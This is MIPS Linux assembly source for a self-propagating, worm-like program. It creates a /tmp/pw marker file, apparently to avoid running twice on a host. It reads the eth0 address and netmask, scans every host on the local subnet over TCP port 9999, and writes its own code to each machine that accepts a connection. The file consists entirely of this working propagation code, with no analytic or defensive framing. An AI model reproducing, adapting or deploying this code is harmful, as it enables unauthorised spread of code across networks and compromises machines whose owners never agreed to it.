        .text
        .globl __start
__start:
	# Get pointer to data
	bal 	data
start0:
	move 	$t0, $ra

	# Create file
	# ---------------------------------------------------
	# O_CREAT and O_EXCL are defined in /usr/mips...
	# fcntl.h is first included that includes the bits/fcntl.h who
	# defines O_CREAT and O_EXECL as 0x0100 and 0x0400
	# ---------------------------------------------------
	li   	$v0, 4005       # fd = open (fname, FLAGS)
	move 	$a0, $t0        # File Name
        li   	$a1, 0x0500
        li   	$a2, 0700
        syscall
	bgtz 	$a3, done   	# on Error $a3 = 1 (*man syscall for details)
	
	# Close file
	move 	$a0, $v0
	li   	$v0, 4006   	# Close
	syscall

	# Create socket to query network inform
	li   	$v0, 4183       # socket
	li   	$a0, 2
	li   	$a1, 2          # Also this contant is different
	li   	$a2, 6
	syscall
	move 	$t9, $v0        # Store socket in t1 for later

	# Store device name
	li     $a0, 0x65746830  # Big Endian
	sw     $a0, -0x40($sp)
	
	# Get IP
	li     	$v0, 4054
	move   	$a0, $t9
	li    	$a1, 0x8915
	addiu  	$a2, $sp, -0x40 # a1 points to buffer in stack
	syscall
	lw     	$t2, -0x2c($sp) # Store IP in t2

	# Get Netmask
	li     	$v0, 4054
	move   	$a0, $t9
	li    	$a1, 0x891b
	syscall
	lw     	$t3, -0x2c($sp) # Store Netmask in t3

	# Close socket
	li    	$v0, 4006       # Close query socket
	move  	$a0, $t9
	syscall
	
	# Calculate network address
	and     $t2, $t2, $t3

	# Calculate Number of hosts
	nor 	$t3, $t3, $zero

	# Set family and port
	li 	$v0, 0x0002270f
	sw 	$v0, -0x30($sp)

	move 	$t4, $zero
	
	# Variables so far
	#  t0  -> Data
	#  t1  -> _start
	#  t2  -> Network address
	#  t3  -> Number of hosts to scan
	#  t4  -> Loop index
	#  t5  -> Socket
	#  t6  -> Internal loop

scan:
	# Skip addresses ending in 00 and FF
	and 	$v0, $t4, 0xff     # Get lower byte
	li  	$v1, 0xff	
	beq 	$v0, $zero, next_loop	
	beq 	$v0, $v1,   next_loop

	# Create socket
	li 	$v0, 4183       # socket
	li 	$a0, 2
	li 	$a1, 2          # Also this contant is different
	li 	$a2, 6
	syscall
	move 	$t5, $v0
	
	# Make socket NON-BLOCKING
	move 	$a0, $t5
	li   	$a1, 4
	li   	$a2, 0x80
	li   	$v0, 4055       # fcntl
	syscall
	
	# Calculate target address
	or 	$a0, $t2, $t4
	sw 	$a0, -0x2c($sp)

	# Connect loop
	li   	$a2, 16
	li   	$t6, 4          # Reconnect loop
	
try_connect:
	li   	$v0, 4170       # Connect
	move 	$a0, $t5
	add  	$a1, $sp, -0x30	
	syscall
	beq  	$a3, $zero, move  # If no error move code and continue
	
	# here we have an error... If it is not EINPROGRESS... keep scanning
	bne  	$v0, 150, next
	
	# nanosleep call
	li   	$v0, 4166       # nanosleep
	add  	$a0, $t0, 8     # Point first parameter to delay
	move 	$a1, $zero
	syscall

	sub 	$t6, $t6, 1
	bne 	$t6, $zero, try_connect
	
move:	
	# Copy
	li 	$v0, 4004       # Write
	move  	$a0, $t5
	move  	$a1, $t1
	li   	$a2, code_size
	syscall

next:	
	# Close Socket
	li   	$v0, 4006
	move 	$a0, $t5
	syscall

next_loop:
	add 	$t4, $t4, 1
	bgt 	$t4, $t3, done
	b 	scan

done:
        # Exit
        li 	$v0, 4001
        syscall


	# Force alignment here so we know exactly where the data starts
	.balign 8
data:
	nop
	add $t1, $ra, -8 # Store __start in $t1
	bal start0

	# Labels for quads will be 4 bytes aligned,  but labels for .ascii not
	# Therefore declaring .mark as ascii will force a null in data bellow
	# Declaring it as a quad keeps data perfectly aligned

#mark:           .ascii "/tmp/pw"
mark:		.quad 0x2f746d702f707700
delay:	        .quad 0
delay_nsec:	.quad 50000000
end_code:	.equ	code_size, end_code - __start

